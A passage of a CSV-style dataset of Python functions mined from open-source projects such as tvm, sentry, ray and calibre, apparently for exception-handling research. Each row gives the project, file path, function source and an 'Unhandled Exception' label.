            return source.split(""="")[0].strip()
        return func.__name__
    elif s == ""_Invert"":
        operand = cast(_Invert, filter_).filter
        if operand.__class__.__name__ in ATOMIC_CLASSES:
            return f""~{format_filter(operand, is_top_level=False)}""
        return f""~({format_filter(operand, is_top_level=False)})""
    elif s in conjunctions_labels:
        filters = cast(_NestedFilter, filter_).filters
        if filter_ in HUMAN_NAMES_FOR_FILTERS:
            return HUMAN_NAMES_FOR_FILTERS[filter_]
        conjunction = conjunctions_labels[s]
        glue = f"" {conjunction} ""
        result = glue.join(format_filter(x, is_top_level=False) for x in filters)
        if len(filters) > 1 and not is_top_level:
            result = f""({result})""
        return result
    elif s in [""Never"", ""Always""]:
        return s.lower()
    elif s == ""PassThrough"":
        return ""pass_through""
    else:
        raise ValueError(f""Unknown filter type: {filter_}"")",Unhandled Exception,1
336,xx-net,/home/r4ph/desenv/exception-miner/projects/py/xx-net/code/default/lib/noarch/tlslite/utils/keyfactory.py,parsePrivateKey,"def parsePrivateKey(s):
    """"""Parse a PEM-formatted private key.

    :type s: str
    :param s: A string containing a PEM-encoded private key.

    :rtype: ~tlslite.utils.rsakey.RSAKey
    :returns: An RSA private key.

    :raises SyntaxError: If the key is not properly formatted.
    """"""
    return parsePEMKey(s, private=True)",Unhandled Exception,1
337,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/utils/check_repo.py,check_all_objects_are_documented,"def check_all_objects_are_documented():
    """"""Check all models are properly documented.""""""
    documented_objs = find_all_documented_objects()
    modules = transformers._modules
    objects = [c for c in dir(transformers) if c not in modules and not c.startswith(""_"")]
    undocumented_objs = [c for c in objects if c not in documented_objs and not ignore_undocumented(c)]
    if len(undocumented_objs) > 0:
        raise Exception(
            ""The following objects are in the public init so should be documented:\n - ""
            + ""\n - "".join(undocumented_objs)
        )
    check_docstrings_are_in_md()
    check_model_type_doc_match()",Unhandled Exception,1
338,pysnooper,/home/r4ph/desenv/exception-miner/projects/py/pysnooper/tests/mini_toolbox/pathlib.py,rglob,"def rglob(self, pattern):
        """"""Recursively yield all existing files (of any kind, including
        directories) matching the given pattern, anywhere in this subtree.
        """"""
        pattern = self._flavour.casefold(pattern)
        drv, root, pattern_parts = self._flavour.parse_parts((pattern,))
        if drv or root:
            raise NotImplementedError(""Non-relative patterns are unsupported"")
        selector = _make_selector((""**"",) + tuple(pattern_parts))
        for p in selector.select_from(self):
            yield p",Unhandled Exception,1
339,gamestonkterminal,/home/r4ph/desenv/phd/exception-miner/projects/py/gamestonkterminal/openbb_terminal/stocks/fundamental_analysis/dcf_model.py,get_similar_dfs,"def get_similar_dfs(symbol: str, info: Dict[str, Any], n: int, no_filter: bool = False):
    """"""
    Get dataframes for similar companies

    Parameters
    ----------
    symbol : str
        The ticker symbol to create a dataframe for
    into : Dict[str,Any]
        The dictionary based on info collected from fd.Equities()
    n : int
        The number of similar companies to produce
    no_filter : bool
        True means that we do not filter based on market cap

    Returns
    -------
    new_list : List[str, pd.DataFrame]
        A list of similar companies
    """"""
    similars = others_in_sector(
        symbol, info[""sector""], info[""industry_group""], info[""industry""], no_filter
    )
    i = 0
    new_list = []
    while i < n and similars:
        similar_ret = [create_dataframe(similars[0], x)[0] for x in [""BS"", ""IS"", ""CF""]]
        blank = [x.empty for x in similar_ret]
        if True not in blank:
            vals = [similars[0], similar_ret]
            new_list.append(vals)
            i += 1
        similars.pop(0)
    return new_list",Unhandled Exception,1
340,peewee,/home/r4ph/desenv/phd/exception-miner/projects/py/peewee/tests/libs/mock.py,_set_signature,"def _set_signature(mock, original, instance=False):
    # creates a function with signature (*args, **kwargs) that delegates to a
    # mock. It still does signature checking by calling a lambda with the same
    # signature as the original.
    if not _callable(original):
        return

    skipfirst = isinstance(original, ClassTypes)
    result = _getsignature(original, skipfirst, instance)
    if result is None:
        # was a C function (e.g. object().__init__ ) that can't be mocked
        return

    signature, func = result

    src = ""lambda %s: None"" % signature
    checksig = eval(src, {})
    _copy_func_details(func, checksig)

    name = original.__name__
    if not _isidentifier(name):
        name = 'funcopy'
    context = {'_checksig_': checksig, 'mock': mock}
    src = """"""def %s(*args, **kwargs):
    _checksig_(*args, **kwargs)
    return mock(*args, **kwargs)"""""" % name
    exec (src, context)
    funcopy = context[name]
    _setup_func(funcopy, mock)
    return funcopy",Unhandled Exception,1
341,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/utils/img.py,image_has_transparent_pixels,"def image_has_transparent_pixels(img):
    ' Return True iff the image has at least one semi-transparent pixel '
    img = image_from_data(img)
    if img.isNull():
        return False
    return imageops.has_transparent_pixels(img)",Unhandled Exception,1
342,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/pgsql/parser/ast_builder.py,_build_table_element,"def _build_table_element(n: Node, c: Context) -> pgast.TableElement:
    return _enum(
        pgast.TableElement,
        n,
        c,
        {
            ""ColumnDef"": _build_column_def,
        },
    )",Unhandled Exception,1
343,bup,/home/r4ph/desenv/phd/exception-miner/projects/py/bup/lib/bup/vint.py,recv,"def recv(port, types):
    result = []
    for type in types:
        if type == 'V':
            result.append(read_vuint(port))
        elif type == 'v':
            result.append(read_vint(port))
        elif type == 's':
            result.append(read_bvec(port))
        else:
            raise Exception('unknown xunpack format string item ""' + type + '""')
    return result",Unhandled Exception,1
344,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/rllib/utils/checkpoints.py,convert_to_msgpack_checkpoint,"def convert_to_msgpack_checkpoint(
    checkpoint: Union[str, Checkpoint],
    msgpack_checkpoint_dir: str,
) -> str:
    """"""Converts an Algorithm checkpoint (pickle based) to a msgpack based one.

    Msgpack has the advantage of being python version independent.

    Args:
        checkpoint: The directory, in which to find the Algorithm checkpoint (pickle
            based).
        msgpack_checkpoint_dir: The directory, in which to create the new msgpack
            based checkpoint.

    Returns:
        The directory in which the msgpack checkpoint has been created. Note that
        this is the same as `msgpack_checkpoint_dir`.
    """"""
    from ray.rllib.algorithms import Algorithm
    from ray.rllib.utils.policy import validate_policy_id

    # Try to import msgpack and msgpack_numpy.
    msgpack = try_import_msgpack(error=True)

    # Restore the Algorithm using the python version dependent checkpoint.
    algo = Algorithm.from_checkpoint(checkpoint)
    state = algo.__getstate__()

    # Convert all code in state into serializable data.
    # Serialize the algorithm class.
    state[""algorithm_class""] = serialize_type(state[""algorithm_class""])
    # Serialize the algorithm's config object.
    state[""config""] = state[""config""].serialize()

    # Extract policy states from worker state (Policies get their own
    # checkpoint sub-dirs).
    policy_states = {}
    if ""worker"" in state and ""policy_states"" in state[""worker""]:
        policy_states = state[""worker""].pop(""policy_states"", {})

    # Policy mapping fn.
    state[""worker""][""policy_mapping_fn""] = NOT_SERIALIZABLE
    # Is Policy to train function.
    state[""worker""][""is_policy_to_train""] = NOT_SERIALIZABLE

    # Add RLlib checkpoint version (as string).
    if state[""config""][""_enable_learner_api""]:
        state[""checkpoint_version""] = str(CHECKPOINT_VERSION_LEARNER)
    else:
        state[""checkpoint_version""] = str(CHECKPOINT_VERSION)

    # Write state (w/o policies) to disk.
    state_file = os.path.join(msgpack_checkpoint_dir, ""algorithm_state.msgpck"")
    with open(state_file, ""wb"") as f:
        msgpack.dump(state, f)

    # Write rllib_checkpoint.json.
    with open(os.path.join(msgpack_checkpoint_dir, ""rllib_checkpoint.json""), ""w"") as f:
        json.dump(
            {
                ""type"": ""Algorithm"",
                ""checkpoint_version"": state[""checkpoint_version""],
                ""format"": ""msgpack"",
                ""state_file"": state_file,
                ""policy_ids"": list(policy_states.keys()),
                ""ray_version"": ray.__version__,
                ""ray_commit"": ray.__commit__,
            },
            f,
        )

    # Write individual policies to disk, each in their own sub-directory.
    for pid, policy_state in policy_states.items():
        # From here on, disallow policyIDs that would not work as directory names.
        validate_policy_id(pid, error=True)
        policy_dir = os.path.join(msgpack_checkpoint_dir, ""policies"", pid)
        os.makedirs(policy_dir, exist_ok=True)
        policy = algo.get_policy(pid)
        policy.export_checkpoint(
            policy_dir,
            policy_state=policy_state,
            checkpoint_format=""msgpack"",
        )

    # Release all resources used by the Algorithm.
    algo.stop()

    return msgpack_checkpoint_dir",Unhandled Exception,1
345,chia-blockchain,/home/r4ph/desenv/phd/exception-miner/projects/py/chia-blockchain/chia/cmds/keys_funcs.py,derive_child_key,"def derive_child_key(
    master_sk: PrivateKey,
    key_type: Optional[str],
    derive_from_hd_path: Optional[str],
    index: int,
    count: int,
    non_observer_derivation: bool,
    show_private_keys: bool,
    show_hd_path: bool,
) -> None:
    """"""
    Derive child keys from the provided master key.
    """"""

    from chia.wallet.derive_keys import _derive_path, _derive_path_unhardened

    derivation_root_sk: Optional[PrivateKey] = None
    hd_path_root: Optional[str] = None
    current_sk: Optional[PrivateKey] = None

    # Key type was specified
    if key_type is not None:
        path_indices: List[int] = [12381, 8444]
        path_indices.append(
            {
                ""farmer"": 0,
                ""pool"": 1,
                ""wallet"": 2,
                ""local"": 3,
                ""backup"": 4,
                ""singleton"": 5,
                ""pool_auth"": 6,
            }[key_type]
        )

        if non_observer_derivation:
            current_sk = _derive_path(master_sk, path_indices)
        else:
            current_sk = _derive_path_unhardened(master_sk, path_indices)

        derivation_root_sk = current_sk
        hd_path_root = ""m/""
        for i in path_indices:
            hd_path_root += f""{i}{'n' if non_observer_derivation else ''}/""
    # Arbitrary HD path was specified
    elif derive_from_hd_path is not None:
        derivation_root_sk, hd_path_root = derive_sk_from_hd_path(master_sk, derive_from_hd_path)

    # Derive child keys from derivation_root_sk
    if derivation_root_sk is not None and hd_path_root is not None:
        for i in range(index, index + count):
            if non_observer_derivation:
                sk = _derive_path(derivation_root_sk, [i])
            else:
                sk = _derive_path_unhardened(derivation_root_sk, [i])
            hd_path: str = (
                "" ("" + hd_path_root + str(i) + (""n"" if non_observer_derivation else """") + "")"" if show_hd_path else """"
            )
            key_type_str: Optional[str]

            if key_type is not None:
                key_type_str = key_type.capitalize()
            else:
                key_type_str = ""Non-Observer"" if non_observer_derivation else ""Observer""

            print(f""{key_type_str} public key {i}{hd_path}: {sk.get_g1()}"")
            if show_private_keys:
                print(f""{key_type_str} private key {i}{hd_path}: {private_key_string_repr(sk)}"")",Unhandled Exception,1
346,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/tools/lib/auth.py,login,"def login(method):
  oauth_uri = auth_redirect_link(method)

  web_server = ClientRedirectServer(('localhost', PORT), ClientRedirectHandler)
  print(f'To sign in, use your browser and navigate to {oauth_uri}')
  webbrowser.open(oauth_uri, new=2)

  while True:
    web_server.handle_request()
    if 'code' in web_server.query_params:
      break
    elif 'error' in web_server.query_params:
      print('Authentication Error: ""{}"". Description: ""{}"" '.format(
        web_server.query_params['error'],
        web_server.query_params.get('error_description')), file=sys.stderr)
      break

  try:
    auth_resp = CommaApi().post('v2/auth/', data={'code': web_server.query_params['code'], 'provider': web_server.query_params['provider']})
    set_token(auth_resp['access_token'])
  except APIError as e:
    print(f'Authentication Error: {e}', file=sys.stderr)",Unhandled Exception,1
347,datasets,/home/r4ph/desenv/phd/exception-miner/projects/py/datasets/src/datasets/download/streaming_download_manager.py,xet_parse,"def xet_parse(source, parser=None, download_config: Optional[DownloadConfig] = None):
    """"""Extend `xml.etree.ElementTree.parse` function to support remote files.

    Args:
        source: File path or file object.
        parser (`XMLParser`, *optional*, default `XMLParser`): Parser instance.
        download_config : mainly use token or storage_options to support different platforms and auth types.

    Returns:
        `xml.etree.ElementTree.Element`: Root element of the given source document.
    """"""
    if hasattr(source, ""read""):
        return ET.parse(source, parser=parser)
    else:
        with xopen(source, ""rb"", download_config=download_config) as f:
            return ET.parse(f, parser=parser)",Unhandled Exception,1
348,sentry,/home/r4ph/desenv/exception-miner/projects/py/sentry/src/sentry/tasks/deletion/hybrid_cloud.py,process_hybrid_cloud_foreign_key_cascade_batch,"def process_hybrid_cloud_foreign_key_cascade_batch(
    app_name: str, model_name: str, field_name: str, silo_mode: str
) -> None:
    try:
        model = apps.get_model(app_label=app_name, model_name=model_name)
        try:
            field = model._meta.get_field(field_name)
            if not isinstance(field, HybridCloudForeignKey):
                raise Exception(f""The {field_name} field is not a HybridCloudForeignKey"")
        except Exception as err:
            sentry_sdk.capture_exception(err)
            raise LookupError(f""Could not find field {field_name} on model {app_name}.{model_name}"")

        tombstone_cls: Any = TombstoneBase.class_for_silo_mode(SiloMode[silo_mode])

        # We rely on the return value of _process_tombstone_reconciliation
        # to short circuit the second half of this `or` so that the terminal batch
        # also updates the tombstone watermark.
        if _process_tombstone_reconciliation(
            field, model, tombstone_cls, True
        ) or _process_tombstone_reconciliation(field, model, tombstone_cls, False):
            process_hybrid_cloud_foreign_key_cascade_batch.apply_async(
                kwargs=dict(
                    app_name=app_name,
                    model_name=model_name,
                    field_name=field_name,
                    silo_mode=silo_mode,
                ),
                countdown=15,
            )
    except Exception as err:
        sentry_sdk.set_context(
            ""deletion.hybrid_cloud"",
            dict(
                app_name=app_name,
                model_name=model_name,
                field_name=field_name,
                silo_mode=silo_mode,
            ),
        )
        sentry_sdk.capture_exception(err)
        raise err",Unhandled Exception,1
349,qutebrowser,/home/r4ph/desenv/phd/exception-miner/projects/py/qutebrowser/tests/unit/browser/webkit/test_webkitelem.py,test_is_writable,"def test_is_writable(self, attributes, writable):
        elem = get_webelem(attributes=attributes)
        assert elem.is_writable() == writable",Unhandled Exception,1
350,paddlehub,/home/r4ph/desenv/phd/exception-miner/projects/py/paddlehub/modules/image/text_to_image/disco_diffusion_cnclip_vitb16/reverse_diffusion/model/transforms.py,_setup_angle,"def _setup_angle(x, name, req_sizes=(2, )):
    if isinstance(x, numbers.Number):
        if x < 0:
            raise ValueError(f""If {name} is a single number, it must be positive."")
        x = [-x, x]
    else:
        _check_sequence_input(x, name, req_sizes)

    return [float(d) for d in x]",Unhandled Exception,1
351,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/tests/python/frontend/pytorch/test_forward.py,test_forward_bitwise_not,"def test_forward_bitwise_not():
    """"""test_forward_bitwise_not""""""
    torch.set_grad_enabled(False)

    class BitwiseNot1(Module):
        def forward(self, *args):
            return torch.bitwise_not(args[0])

    input_data = torch.tensor([0, 1, -10], dtype=torch.int8)
    verify_model(BitwiseNot1().float().eval(), input_data=input_data)

    input_data = torch.tensor([0.0, 1.0, -10.0], dtype=torch.int32)
    verify_model(BitwiseNot1().float().eval(), input_data=input_data)

    input_data = torch.tensor([True, False])
    verify_model(BitwiseNot1().float().eval(), input_data=input_data)",Unhandled Exception,1
352,autokeras,/home/r4ph/desenv/phd/exception-miner/projects/py/autokeras/docs/tutobooks.py,py_to_md,"def py_to_md(py_path, nb_path, md_path, img_dir, working_dir=None):
    py_to_nb(py_path, nb_path, fill_outputs=False)
    nb_to_md(nb_path, md_path, img_dir, working_dir=working_dir)",Unhandled Exception,1
353,microk8s,/home/r4ph/desenv/phd/exception-miner/projects/py/microk8s/scripts/wrappers/addons.py,validate_addons_repo,"def validate_addons_repo(repo_dir: Path) -> None:
    """"""
    Runs some checks on an addons repository.
    Inner validations raise SystemExit if any of the validations fail.
    """"""
    validate_addons_file(repo_dir)
    validate_hooks(repo_dir)",Unhandled Exception,1
354,dgl,/home/r4ph/desenv/phd/exception-miner/projects/py/dgl/dglgo/dglgo/cli/train_cli.py,train,"def train(
    cfg: str = typer.Option(""cfg.yaml"", help=""config yaml file name""),
):
    user_cfg = yaml.safe_load(Path(cfg).open(""r""))
    pipeline_name = user_cfg[""pipeline_name""]
    output_file_content = PipelineFactory.registry[pipeline_name].gen_script(
        user_cfg
    )

    f_code = autopep8.fix_code(output_file_content, options={""aggressive"": 1})
    f_code = isort.code(f_code)
    code = compile(f_code, ""dglgo_tmp.py"", ""exec"")
    exec(code, {""__name__"": ""__main__""})",Unhandled Exception,1
355,python-prompt-toolkit,/home/r4ph/desenv/phd/exception-miner/projects/py/python-prompt-toolkit/src/prompt_toolkit/layout/containers.py,_get_container,"def _get_container(self) -> Container:
        """"""
        Return the current container object.

        We call `to_container`, because `get_container` can also return a
        widget with a ``__pt_container__`` method.
        """"""
        obj = self.get_container()
        return to_container(obj)",Unhandled Exception,1
356,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/rllib/common.py,download_example_file,"def download_example_file(
    example_file: str,
    base_url: Optional[str] = ""https://raw.githubusercontent.com/""
    + ""ray-project/ray/master/rllib/"",
):
    """"""Download the example file (e.g. from GitHub) if it doesn't exist locally.
    If the provided example file exists locally, we return it directly.

    Not every user will have cloned our repo and cd'ed into this working directory
    when using the CLI.

    Args:
        example_file: The example file to download.
        base_url: The base URL to download the example file from. Use this if
            'example_file' is a link relative to this base URL. If set to 'None',
            'example_file' is assumed to be a complete URL (or a local file, in which
            case nothing is downloaded).
    """"""
    temp_file = None
    if not os.path.exists(example_file):

        example_url = base_url + example_file if base_url else example_file
        print(f"">>> Attempting to download example file {example_url}..."")

        file_type = get_file_type(example_url)
        if file_type == SupportedFileType.yaml:
            temp_file = tempfile.NamedTemporaryFile(suffix="".yaml"")
        else:
            assert (
                file_type == SupportedFileType.python
            ), f""`example_url` ({example_url}) must be a python or yaml file!""
            temp_file = tempfile.NamedTemporaryFile(suffix="".py"")

        r = requests.get(example_url)
        with open(temp_file.name, ""wb"") as f:
            print(r.content)
            f.write(r.content)

        print(f""  Status code: {r.status_code}"")
        if r.status_code == 200:
            print(f""  Downloaded example file to {temp_file.name}"")
            # only overwrite the file if the download was successful
            example_file = temp_file.name

    return example_file, temp_file",Unhandled Exception,1
357,insightface,/home/r4ph/desenv/phd/exception-miner/projects/py/insightface/reconstruction/ostec/external/stylegan2/dnnlib/tflib/tfutil.py,set_vars,"def set_vars(var_to_value_dict: dict) -> None:
    """"""Set the values of given tf.Variables.

    Equivalent to the following, but more efficient and does not bloat the tf graph:
    tflib.run([tf.assign(var, value) for var, value in var_to_value_dict.items()]
    """"""
    assert_tf_initialized()
    ops = []
    feed_dict = {}

    for var, value in var_to_value_dict.items():
        assert is_tf_expression(var)

        try:
            setter = tf.get_default_graph().get_tensor_by_name(var.name.replace("":0"", ""/setter:0""))  # look for existing op
        except KeyError:
            with absolute_name_scope(var.name.split("":"")[0]):
                with tf.control_dependencies(None):  # ignore surrounding control_dependencies
                    setter = tf.assign(var, tf.placeholder(var.dtype, var.shape, ""new_value""), name=""setter"")  # create new setter

        ops.append(setter)
        feed_dict[setter.op.inputs[1]] = value

    run(ops, feed_dict)",Unhandled Exception,1
358,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/test/lib/ansible_test/_internal/cli/argparsing/__init__.py,get_completions,"def get_completions(
        self,
        prefix: str,
        action: argparse.Action,
        parsed_args: argparse.Namespace,
    ) -> list[str]:
        """"""Return a list of completions appropriate for the given prefix and action, taking into account the arguments that have already been parsed.""""""
        assert isinstance(action, CompositeAction)

        state = ParserState(
            mode=ParserMode.LIST if self.list_mode else ParserMode.COMPLETE,
            remainder=prefix,
            namespaces=[parsed_args],
        )

        answer = complete(action.definition, state)

        completions = []

        if isinstance(answer, CompletionSuccess):
            self.disable_completion_mangling = answer.preserve
            completions = answer.completions

        if isinstance(answer, CompletionError):
            warn(answer.message)

        return completions",Unhandled Exception,1
359,nni,/home/r4ph/desenv/phd/exception-miner/projects/py/nni/nni_assets/hello_hpo/model.py,train,"def train(dataloader, model, loss_fn, optimizer):
    model.train()
    for batch, (X, y) in enumerate(dataloader):
        X, y = X.to(device), y.to(device)
        pred = model(X)
        loss = loss_fn(pred, y)
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()",Unhandled Exception,1
360,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/python/tvm/rpc/server_ios_launcher.py,shutdown_booted_devices,"def shutdown_booted_devices():
        """"""Shutdown simulators that have been booted using this class.""""""

        for device_meta in ServerIOSLauncher.booted_devices:
            try:
                shutdown_device(get_device_uid(device_meta))
            except RuntimeError as e:
                print(e)
        ServerIOSLauncher.booted_devices = []",Unhandled Exception,1
361,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/apps/microtvm/zephyr/template_project/microtvm_api_server.py,_find_stm32cubeprogrammer_serial_port,"def _find_stm32cubeprogrammer_serial_port(cls, serial_number: str = None):
        return generic_find_serial_port(serial_number)",Unhandled Exception,1
362,models,/home/r4ph/desenv/exception-miner/projects/py/models/official/vision/data/image_utils.py,decode_image_metadata,"def decode_image_metadata(image_bytes: bytes) -> Tuple[int, int, int, str]:
  """"""Decodes image metadata from encoded image string.

  Note that if the image is encoded in RAW format, the metadata cannot be
  inferred from the image bytes.

  Args:
    image_bytes: Encoded image string.

  Returns:
    A tuple of height, width, number of channels, and encoding format.
  """"""
  image_np = decode_image(image_bytes)
  # https://pillow.readthedocs.io/en/stable/reference/Image.html#image-attributes
  height, width, num_channels = image_np.shape
  image_format = imghdr.what(file=None, h=image_bytes)
  return height, width, num_channels, validate_image_format(image_format)",Unhandled Exception,1
363,sentry,/home/r4ph/desenv/exception-miner/projects/py/sentry/src/sentry/snuba/metrics/mqb_query_transformer.py,_transform_select,"def _transform_select(query_select):
    select = []
    for select_field in query_select:
        if isinstance(select_field, (Column, AliasedExpression)):
            if isinstance(select_field, AliasedExpression):
                column_field = select_field.exp
                column_alias = select_field.alias
            else:
                column_field = select_field
                column_alias = None

            try:
                select.append(
                    MetricField(op=None, metric_mri=column_field.name, alias=column_alias)
                )
            except InvalidParams as e:
                raise MQBQueryTransformationException(e)
        elif isinstance(select_field, Function):
            if select_field.function in DERIVED_OPS:
                select.append(_get_derived_op_metric_field_from_snuba_function(select_field))
            else:
                if select_field.function not in OPERATIONS:
                    raise MQBQueryTransformationException(
                        f""Function '{select_field.function}' is not supported""
                    )
                if len(select_field.parameters) == 0 or not isinstance(
                    select_field.parameters[0], Column
                ):
                    raise MQBQueryTransformationException(
                        ""The first parameter of a function should be a column of the metric MRI""
                    )
                select.append(
                    MetricField(
                        op=select_field.function,
                        metric_mri=select_field.parameters[0].name,
                        alias=select_field.alias,
                    )
                )
        else:
            raise MQBQueryTransformationException(f""Unsupported select field {select_field}"")
    return select",Unhandled Exception,1
364,aiohttp,/home/r4ph/desenv/phd/exception-miner/projects/py/aiohttp/tests/test_run_app.py,test_run_app_abstract_linux_socket,"def test_run_app_abstract_linux_socket(patched_loop: Any) -> None:
    sock_path = b""\x00"" + uuid4().hex.encode(""ascii"")
    app = web.Application()
    web.run_app(
        app,
        path=sock_path.decode(""ascii"", ""ignore""),
        print=stopper(patched_loop),
        loop=patched_loop,
    )

    patched_loop.create_unix_server.assert_called_with(
        mock.ANY, sock_path.decode(""ascii""), ssl=None, backlog=128
    )",Unhandled Exception,1
365,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/tests/python/ci/test_ci.py,test_ping_reviewers,"def test_ping_reviewers(tmpdir_factory, pull_request, check):
    """"""
    Test that reviewers are messaged after a time period of inactivity
    """"""
    reviewers_script = GITHUB_SCRIPT_ROOT / ""ping_reviewers.py""

    git = TempGit(tmpdir_factory.mktemp(""tmp_git_dir""))

    data = {
        ""data"": {
            ""repository"": {
                ""pullRequests"": {
                    ""nodes"": [pull_request],
                    ""edges"": [],
                }
            }
        }
    }
    proc = run_script(
        [
            reviewers_script,
            ""--dry-run"",
            ""--wait-time-minutes"",
            ""1"",
            ""--cutoff-pr-number"",
            ""5"",
            ""--pr-json"",
            json.dumps(data),
            ""--now"",
            ""2022-01-26T17:54:19Z"",
        ],
        cwd=git.cwd,
    )
    assert_in(check, proc.stdout)",Unhandled Exception,1
366,frida,/home/r4ph/desenv/phd/exception-miner/projects/py/frida/releng/devkit.py,generate_devkit,"def generate_devkit(kit, host, flavor, output_dir):
    package, umbrella_header = DEVKITS[kit]

    meson_config = load_meson_config(host, flavor)

    library_filename = compute_library_filename(kit)
    (extra_ldflags, thirdparty_symbol_mappings) = generate_library(package,
                                                                   host,
                                                                   flavor,
                                                                   meson_config,
                                                                   output_dir,
                                                                   library_filename)

    umbrella_header_path = compute_umbrella_header_path(host, flavor, package, umbrella_header)

    header_file = output_dir / f""{kit}.h""
    if not umbrella_header_path.exists():
        raise Exception(f""Header not found: {umbrella_header_path}"")
    header_source = generate_header(package,
                                    host,
                                    kit,
                                    flavor,
                                    meson_config,
                                    umbrella_header_path,
                                    thirdparty_symbol_mappings)
    header_file.write_text(header_source, encoding=""utf-8"")

    example_file = output_dir / f""{kit}-example.c""
    example_source = generate_example(example_file,
                                      package,
                                      host,
                                      kit,
                                      flavor,
                                      meson_config,
                                      extra_ldflags)
    example_file.write_text(example_source, encoding=""utf-8"")

    extra_files = []

    extra_files += generate_gir(host, kit, flavor, output_dir)

    if platform.system() == ""Windows"":
        for msvs_asset in glob(str(asset_path(f""{kit}-*.sln""))) + glob(str(asset_path(f""{kit}-*.vcxproj*""))):
            shutil.copy(msvs_asset, output_dir)
            extra_files.append(Path(msvs_asset).name)

    return [header_file.name, library_filename, example_file.name] + extra_files",Unhandled Exception,1
367,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/python/tvm/topi/x86/dense.py,dense_mkl,"def dense_mkl(cfg, data, weight, bias=None, out_dtype=None):
    """"""Compute dense using mkl. This is an alias of matmul_nt operator.""""""
    return matmul_blas_common(cfg, data, weight, bias, out_dtype, False, True, mkl)",Unhandled Exception,1
368,insightface,/home/r4ph/desenv/phd/exception-miner/projects/py/insightface/reconstruction/jmlr/backbones/iresnet.py,iresnet18,"def iresnet18(pretrained=False, progress=True, **kwargs):
    return _iresnet('iresnet18', IBasicBlock, [2, 2, 2, 2], pretrained,
                    progress, **kwargs)",Unhandled Exception,1
369,scipy,/home/r4ph/desenv/phd/exception-miner/projects/py/scipy/dev.py,cpu_count,"def cpu_count(only_physical_cores=False):
    """"""Return the number of CPUs the current process can use.

    The returned number of CPUs accounts for:
     * the number of CPUs in the system, as given by
       ``multiprocessing.cpu_count``;
     * the CPU affinity settings of the current process
       (available on some Unix systems);
     * Cgroup CPU bandwidth limit (available on Linux only, typically
       set by docker and similar container orchestration systems);
     * the value of the LOKY_MAX_CPU_COUNT environment variable if defined.
    and is given as the minimum of these constraints.

    If ``only_physical_cores`` is True, return the number of physical cores
    instead of the number of logical cores (hyperthreading / SMT). Note that
    this option is not enforced if the number of usable cores is controlled in
    any other way such as: process affinity, Cgroup restricted CPU bandwidth
    or the LOKY_MAX_CPU_COUNT environment variable. If the number of physical
    cores is not found, return the number of logical cores.

    Note that on Windows, the returned number of CPUs cannot exceed 61 (or 60 for
    Python < 3.10), see:
    https://bugs.python.org/issue26903.

    It is also always larger or equal to 1.
    """"""
    # Note: os.cpu_count() is allowed to return None in its docstring
    os_cpu_count = os.cpu_count() or 1
    if sys.platform == ""win32"":
        # On Windows, attempting to use more than 61 CPUs would result in a
        # OS-level error. See https://bugs.python.org/issue26903. According to
        # https://learn.microsoft.com/en-us/windows/win32/procthread/processor-groups
        # it might be possible to go beyond with a lot of extra work but this
        # does not look easy.
        os_cpu_count = min(os_cpu_count, _MAX_WINDOWS_WORKERS)

    cpu_count_user = _cpu_count_user(os_cpu_count)
    aggregate_cpu_count = max(min(os_cpu_count, cpu_count_user), 1)

    if not only_physical_cores:
        return aggregate_cpu_count

    if cpu_count_user < os_cpu_count:
        # Respect user setting
        return max(cpu_count_user, 1)

    cpu_count_physical, exception = _count_physical_cores()
    if cpu_count_physical != ""not found"":
        return cpu_count_physical

    # Fallback to default behavior
    if exception is not None:
        # warns only the first time
        warnings.warn(
            ""Could not find the number of physical cores for the ""
            f""following reason:\n{exception}\n""
            ""Returning the number of logical cores instead. You can ""
            ""silence this warning by setting LOKY_MAX_CPU_COUNT to ""
            ""the number of cores you want to use.""
        )
        traceback.print_tb(exception.__traceback__)

    return aggregate_cpu_count",Unhandled Exception,1
370,cython,/home/r4ph/desenv/phd/exception-miner/projects/py/cython/tests/run/test_named_expressions.py,test_named_expression_invalid_17,"def test_named_expression_invalid_17(self):
        code = ""[i := 0, j := 1 for i, j in [(1, 2), (3, 4)]]""

        # TODO at the moment the error message is valid, but not the same as Python
        with self.assertRaisesRegex(SyntaxError, """"):
            exec(code, {}, {})",Unhandled Exception,1
4860,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/utils/img.py,run_optimizer,"def run_optimizer(file_path, cmd, as_filter=False, input_data=None):
    file_path = os.path.abspath(file_path)
    cwd = os.path.dirname(file_path)
    ext = os.path.splitext(file_path)[1]
    if not ext or len(ext) > 10 or not ext.startswith('.'):
        ext = '.jpg'
    fd, outfile = tempfile.mkstemp(dir=cwd, suffix=ext)
    try:
        if as_filter:
            outf = os.fdopen(fd, 'wb')
        else:
            os.close(fd)
        iname, oname = os.path.basename(file_path), os.path.basename(outfile)
        input_size = os.path.getsize(file_path)

        def repl(q, r):
            cmd[cmd.index(q)] = r
        if not as_filter:
            repl(True, iname), repl(False, oname)
        stdin = subprocess.PIPE if as_filter else None
        stderr = subprocess.PIPE if as_filter else subprocess.STDOUT
        creationflags = subprocess.DETACHED_PROCESS if iswindows else 0
        p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE, stderr=stderr, stdin=stdin, creationflags=creationflags)
        stderr = p.stderr if as_filter else p.stdout
        if as_filter:
            src = input_data or open(file_path, 'rb')

            def copy(src, dest):
                try:
                    shutil.copyfileobj(src, dest)
                finally:
                    src.close(), dest.close()
            inw = Thread(name='CopyInput', target=copy, args=(src, p.stdin))
            inw.daemon = True
            inw.start()
            outw = Thread(name='CopyOutput', target=copy, args=(p.stdout, outf))
            outw.daemon = True
            outw.start()
        raw = force_unicode(stderr.read())
        if p.wait() != 0:
            return raw
        else:
            if as_filter:
                outw.join(60.0), inw.join(60.0)
            try:
                sz = os.path.getsize(outfile)
            except OSError:
                sz = 0
            if sz < 1:
                return '%s returned a zero size image' % cmd[0]
